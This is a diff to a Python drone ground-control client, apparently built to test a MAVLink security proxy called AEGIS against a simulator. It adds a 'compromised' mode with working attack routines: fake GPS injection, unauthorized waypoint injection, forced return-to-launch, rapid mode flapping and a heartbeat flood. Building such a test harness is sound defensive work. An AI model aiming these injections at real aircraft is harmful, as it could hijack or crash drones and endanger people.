@@ -52,7 +52,6 @@ logging.basicConfig(
 )
 logger = logging.getLogger('GCS')
 
-
 class GCSClient:
     """
     Ground Control Station (GCS) Client
@@ -60,16 +59,18 @@ class GCSClient:
     Legitimate operator sending authorized commands to UAV through AEGIS.
     """
     
-    def __init__(self, target_host: str, target_port: int):
+    def __init__(self, target_host: str, target_port: int, compromised: bool = False):
         """
         Initialize GCS connection
         
         Args:
             target_host: Target IP (AEGIS proxy or SITL)
             target_port: Target port (14560 for AEGIS, 14550 for SITL)
+            compromised: True if GCS is compromised (malicious mode)
         """
         self.target_host = target_host
         self.target_port = target_port
+        self.compromised = compromised
         
         # Create MAVLink connection
         connection_string = f'udpout:{target_host}:{target_port}'
@@ -88,6 +89,11 @@ class GCSClient:
                 logger.info("✅ Connected through AEGIS proxy (secure)")
             else:
                 logger.warning("⚠️  Direct connection to SITL (bypassing security!)")
+            
+            if compromised:
+                logger.warning("="*70)
+                logger.warning("⚠️  GCS COMPROMISED — MALICIOUS COMMANDS ENABLED")
+                logger.warning("="*70)
                 
         except Exception as e:
             logger.error(f"❌ Failed to connect: {e}")
@@ -285,6 +291,154 @@ class GCSClient:
         except Exception as e:
             logger.error(f"❌ LAND command failed: {e}")
     
+    # ========================================================================
+    # COMPROMISED GCS - MALICIOUS COMMAND INJECTION
+    # ========================================================================
+    
+    def inject_fake_gps(self, lat: float, lon: float, alt: float):
+        """Inject fake GPS data (malicious)"""
+        logger.warning("="*70)
+        logger.warning("[GCS-COMPROMISED] Injecting fake GPS coordinates")
+        logger.warning("="*70)
+        logger.warning(f"Fake position: Lat={lat:.6f}, Lon={lon:.6f}, Alt={alt}m")
+        
+        try:
+            self.mav.mav.gps_raw_int_send(
+                time_usec=int(time.time() * 1e6),
+                fix_type=3,  # 3D fix
+                lat=int(lat * 1e7),
+                lon=int(lon * 1e7),
+                alt=int(alt * 1000),  # mm
+                eph=100,
+                epv=100,
+                vel=500,
+                cog=18000,
+                satellites_visible=12
+            )
+            self.commands_sent += 1
+            logger.warning("[GCS-COMPROMISED] Injected GPS_RAW_INT")
+            time.sleep(1)
+        except Exception as e:
+            logger.error(f"❌ GPS injection failed: {e}")
+    
+    def inject_malicious_waypoint(self, seq: int, lat: float, lon: float, alt: float):
+        """Inject unauthorized waypoint (malicious)"""
+        logger.warning("="*70)
+        logger.warning("[GCS-COMPROMISED] Injecting malicious waypoint")
+        logger.warning("="*70)
+        logger.warning(f"Waypoint #{seq}: Lat={lat:.6f}, Lon={lon:.6f}, Alt={alt}m")
+        
+        try:
+            self.mav.mav.mission_item_send(
+                target_system=1,
+                target_component=1,
+                seq=seq,
+                frame=mavutil.mavlink.MAV_FRAME_GLOBAL_RELATIVE_ALT,
+                command=mavutil.mavlink.MAV_CMD_NAV_WAYPOINT,
+                current=0,
+                autocontinue=1,
+                param1=0,
+                param2=5,
+                param3=0,
+                param4=0,
+                x=lat,
+                y=lon,
+                z=alt
+            )
+            self.commands_sent += 1
+            logger.warning("[GCS-COMPROMISED] Injected MISSION_ITEM")
+            time.sleep(1)
+        except Exception as e:
+            logger.error(f"❌ Waypoint injection failed: {e}")
+    
+    def inject_forced_rtl(self):
+        """Force Return to Launch (malicious)"""
+        logger.warning("="*70)
+        logger.warning("[GCS-COMPROMISED] Forcing RTL command")
+        logger.warning("="*70)
+        
+        try:
+            self.mav.mav.command_long_send(
+                target_system=1,
+                target_component=1,
+                command=mavutil.mavlink.MAV_CMD_NAV_RETURN_TO_LAUNCH,
+                confirmation=0,
+                param1=0, param2=0, param3=0, param4=0,
+                param5=0, param6=0, param7=0
+            )
+            self.commands_sent += 1
+            logger.warning("[GCS-COMPROMISED] Injected COMMAND_LONG (RTL)")
+            time.sleep(1)
+        except Exception as e:
+            logger.error(f"❌ RTL injection failed: {e}")
+    
+    def inject_mode_flapping(self, cycles: int = 5):
+        """Rapid mode switching attack (malicious)"""
+        logger.warning("="*70)
+        logger.warning("[GCS-COMPROMISED] Initiating mode flapping attack")
+        logger.warning("="*70)
+        logger.warning(f"Switching modes {cycles} times...")
+        
+        try:
+            for i in range(cycles):
+                mode = "GUIDED" if i % 2 == 0 else "LOITER"
+                mode_code = 4 if i % 2 == 0 else 5
+                
+                self.mav.mav.set_mode_send(
+                    target_system=1,
+                    base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+                    custom_mode=mode_code
+                )
+                logger.warning(f"[GCS-COMPROMISED] Injected SET_MODE ({mode})")
+                time.sleep(0.3)
+            
+            self.commands_sent += cycles
+            logger.warning(f"[GCS-COMPROMISED] Mode flapping complete ({cycles} switches)")
+        except Exception as e:
+            logger.error(f"❌ Mode flapping failed: {e}")
+    
+    def inject_message_flood(self, duration_sec: int = 5, rate_hz: int = 50):
+        """Message flooding attack (malicious DoS)"""
+        logger.warning("="*70)
+        logger.warning("[GCS-COMPROMISED] Initiating message flood (DoS)")
+        logger.warning("="*70)
+        logger.warning(f"Flooding for {duration_sec}s at {rate_hz} msgs/sec")
+        
+        start_time = time.time()
+        msg_count = 0
+        
+        try:
+            while (time.time() - start_time) < duration_sec:
+                self.mav.mav.heartbeat_send(
+                    type=mavutil.mavlink.MAV_TYPE_GCS,
+                    autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
+                    base_mode=0,
+                    custom_mode=0,
+                    system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+                )
+                msg_count += 1
+                time.sleep(1.0 / rate_hz)
+                
+                if msg_count % 25 == 0:
+                    logger.warning(f"[GCS-COMPROMISED] Flooded {msg_count} messages...")
+            
+            self.commands_sent += msg_count
+            logger.warning(f"[GCS-COMPROMISED] Flood complete: {msg_count} messages sent")
+        except Exception as e:
+            logger.error(f"❌ Message flood failed: {e}")
+    
+    def toggle_compromised_mode(self):
+        """Toggle between normal and compromised mode"""
+        self.compromised = not self.compromised
+        if self.compromised:
+            logger.warning("="*70)
+            logger.warning("⚠️  GCS COMPROMISED — MALICIOUS MODE ACTIVATED")
+            logger.warning("="*70)
+        else:
+            logger.info("="*70)
+            logger.info("✅ NORMAL MODE — Legitimate operations resumed")
+            logger.info("="*70)
+    
     def disarm_vehicle(self):
         """Disarm the vehicle"""
         logger.info("=" * 70)
@@ -394,20 +548,39 @@ class GCSClient:
         print("   MAVLink Command Interface")
         print("="*70)
         print(f"Connected to AEGIS Gateway: {self.target_host}:{self.target_port}")
+        if self.compromised:
+            print("⚠️  MODE: COMPROMISED (Malicious commands enabled)")
+        else:
+            print("✅ MODE: NORMAL (Legitimate operations)")
         print("="*70)
         
         while True:
-            print("\nSelect an operation:")
-            print()
-            print("[1] Arm Vehicle")
-            print("[2] Takeoff")
-            print("[3] Send Waypoint")
-            print("[4] Change Flight Mode")
-            print("[5] Return to Launch (RTL)")
-            print("[6] Land")
-            print("[7] Request Telemetry")
-            print("[0] Exit GCS")
-            print()
+            if not self.compromised:
+                # NORMAL MODE MENU
+                print("\nSelect an operation:")
+                print()
+                print("[1] Arm Vehicle")
+                print("[2] Takeoff")
+                print("[3] Send Waypoint")
+                print("[4] Change Flight Mode")
+                print("[5] Return to Launch (RTL)")
+                print("[6] Land")
+                print("[7] Request Telemetry")
+                print("[9] ⚠️  Switch to COMPROMISED Mode")
+                print("[0] Exit GCS")
+                print()
+            else:
+                # COMPROMISED MODE MENU
+                print("\n⚠️  COMPROMISED MODE - Malicious Operations:")
+                print()
+                print("[1] Inject Fake GPS")
+                print("[2] Inject Malicious Waypoint")
+                print("[3] Force RTL Command")
+                print("[4] Mode Flapping Attack")
+                print("[5] Message Flood (DoS)")
+                print("[9] ✅ Switch to NORMAL Mode")
+                print("[0] Exit GCS")
+                print()
             
             try:
                 choice = input("Enter choice: ").strip()
@@ -416,50 +589,119 @@ class GCSClient:
                     print("\n🛑 Exiting GCS...")
                     break
                 
-                elif choice == '1':
-                    self.arm_vehicle()
+                elif choice == '9':
+                    # Toggle mode
+                    self.toggle_compromised_mode()
                 
-                elif choice == '2':
-                    try:
-                        alt = input("Enter takeoff altitude (default 10m): ").strip()
-                        altitude = float(alt) if alt else 10
-                        self.takeoff(altitude)
-                    except ValueError:
-                        logger.error("Invalid altitude value")
-                
-                elif choice == '3':
-                    try:
-                        lat = input("Enter latitude (default 47.64042): ").strip()
-                        lon = input("Enter longitude (default -122.14030): ").strip()
-                        alt = input("Enter altitude (default 10): ").strip()
-                        
-                        latitude = float(lat) if lat else 47.64042
-                        longitude = float(lon) if lon else -122.14030
-                        altitude = float(alt) if alt else 10
-                        
-                        self.goto_position(latitude, longitude, altitude)
-                    except ValueError:
-                        logger.error("Invalid coordinate values")
-                
-                elif choice == '4':
-                    print("\nAvailable modes:")
-                    print("  STABILIZE, GUIDED, LOITER, RTL, LAND, AUTO")
-                    mode = input("Enter mode (default GUIDED): ").strip().upper()
-                    if not mode:
-                        mode = "GUIDED"
-                    self.change_mode(mode)
-                
-                elif choice == '5':
-                    self.return_to_launch()
-                
-                elif choice == '6':
-                    self.land()
-                
-                elif choice == '7':
-                    self.request_telemetry()
+                elif not self.compromised:
+                    # NORMAL MODE OPERATIONS
+                    if choice == '1':
+                        self.arm_vehicle()
+                    
+                    elif choice == '2':
+                        try:
+                            alt = input("Enter takeoff altitude (default 10m): ").strip()
+                            altitude = float(alt) if alt else 10
+                            self.takeoff(altitude)
+                        except ValueError:
+                            logger.error("Invalid altitude value")
+                    
+                    elif choice == '3':
+                        try:
+                            lat = input("Enter latitude (default 47.64042): ").strip()
+                            lon = input("Enter longitude (default -122.14030): ").strip()
+                            alt = input("Enter altitude (default 10): ").strip()
+                            
+                            latitude = float(lat) if lat else 47.64042
+                            longitude = float(lon) if lon else -122.14030
+                            altitude = float(alt) if alt else 10
+                            
+                            self.goto_position(latitude, longitude, altitude)
+                        except ValueError:
+                            logger.error("Invalid coordinate values")
+                    
+                    elif choice == '4':
+                        print("\nAvailable modes:")
+                        print("  STABILIZE, GUIDED, LOITER, RTL, LAND, AUTO")
+                        mode = input("Enter mode (default GUIDED): ").strip().upper()
+                        if not mode:
+                            mode = "GUIDED"
+                        self.change_mode(mode)
+                    
+                    elif choice == '5':
+                        self.return_to_launch()
+                    
+                    elif choice == '6':
+                        self.land()
+                    
+                    elif choice == '7':
+                        self.request_telemetry()
+                    
+                    else:
+                        print("❌ Invalid choice. Please try again.")
                 
                 else:
-                    print("❌ Invalid choice. Please try again.")
+                    # COMPROMISED MODE OPERATIONS
+                    if choice == '1':
+                        # Inject fake GPS
+                        try:
+                            lat = input("Enter fake latitude (default 37.7749): ").strip()
+                            lon = input("Enter fake longitude (default -122.4194): ").strip()
+                            alt = input("Enter fake altitude (default 1000): ").strip()
+                            
+                            latitude = float(lat) if lat else 37.7749
+                            longitude = float(lon) if lon else -122.4194
+                            altitude = float(alt) if alt else 1000
+                            
+                            self.inject_fake_gps(latitude, longitude, altitude)
+                        except ValueError:
+                            logger.error("Invalid coordinate values")
+                    
+                    elif choice == '2':
+                        # Inject malicious waypoint
+                        try:
+                            seq = input("Enter waypoint sequence (default 99): ").strip()
+                            lat = input("Enter latitude (default 40.7128): ").strip()
+                            lon = input("Enter longitude (default -74.0060): ").strip()
+                            alt = input("Enter altitude (default 500): ").strip()
+                            
+                            sequence = int(seq) if seq else 99
+                            latitude = float(lat) if lat else 40.7128
+                            longitude = float(lon) if lon else -74.0060
+                            altitude = float(alt) if alt else 500
+                            
+                            self.inject_malicious_waypoint(sequence, latitude, longitude, altitude)
+                        except ValueError:
+                            logger.error("Invalid values")
+                    
+                    elif choice == '3':
+                        # Force RTL
+                        self.inject_forced_rtl()
+                    
+                    elif choice == '4':
+                        # Mode flapping
+                        try:
+                            cycles = input("Enter number of cycles (default 5): ").strip()
+                            num_cycles = int(cycles) if cycles else 5
+                            self.inject_mode_flapping(num_cycles)
+                        except ValueError:
+                            logger.error("Invalid cycle count")
+                    
+                    elif choice == '5':
+                        # Message flood
+                        try:
+                            duration = input("Enter duration in seconds (default 5): ").strip()
+                            rate = input("Enter message rate (default 50): ").strip()
+                            
+                            dur = int(duration) if duration else 5
+                            msg_rate = int(rate) if rate else 50
+                            
+                            self.inject_message_flood(dur, msg_rate)
+                        except ValueError:
+                            logger.error("Invalid parameter values")
+                    
+                    else:
+                        print("❌ Invalid choice. Please try again.")
                 
                 time.sleep(1)
                 
@@ -521,6 +763,8 @@ Examples:
                        help='Target IP address (AEGIS proxy or SITL)')
     parser.add_argument('--port', type=int,
                        help='Target port (14560=AEGIS, 14550=SITL)')
+    parser.add_argument('--mode', choices=['normal', 'compromised'], default='normal',
+                       help='GCS mode: normal (legitimate) or compromised (malicious)')
     parser.add_argument('--mission', action='store_true',
                        help='Run automated mission scenario')
     parser.add_argument('--test', action='store_true',
@@ -538,8 +782,11 @@ Examples:
     target_host = args.target or conn_config.get('aegis_ip', '127.0.0.1')
     target_port = args.port or conn_config.get('aegis_port', 14560)
     
+    # Determine if GCS is compromised
+    compromised = (args.mode == 'compromised')
+    
     # Create GCS client
-    gcs = GCSClient(target_host, target_port)
+    gcs = GCSClient(target_host, target_port, compromised)
     
     logger.info("=" * 70)
     logger.info("🎮 GCS Client Started")
